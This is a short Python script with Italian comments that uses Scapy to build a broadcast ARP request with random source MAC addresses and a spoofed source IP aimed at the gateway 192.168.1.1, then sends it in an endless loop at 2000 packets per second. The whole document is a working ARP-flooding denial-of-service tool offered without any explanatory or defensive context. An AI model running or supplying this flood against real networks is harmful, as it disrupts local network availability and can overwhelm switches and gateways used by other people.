from scapy.all import *

iface = "eth0"

# Pacchetto ARP con IP/MAC falsi per flood
pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC()) / ARP(
    op=1,                      # ARP request
    hwsrc=RandMAC(),           # MAC sorgente (random)
    psrc="192.168.1.123",      # IP sorgente (fittizio)
    hwdst="00:00:00:00:00:00", # MAC destinatario (non serve in broadcast)
    pdst="192.168.1.1"         # IP target (l'obiettivo dell'ARP)
)

sendpfast(pkt, pps=2000, loop=0, iface=iface)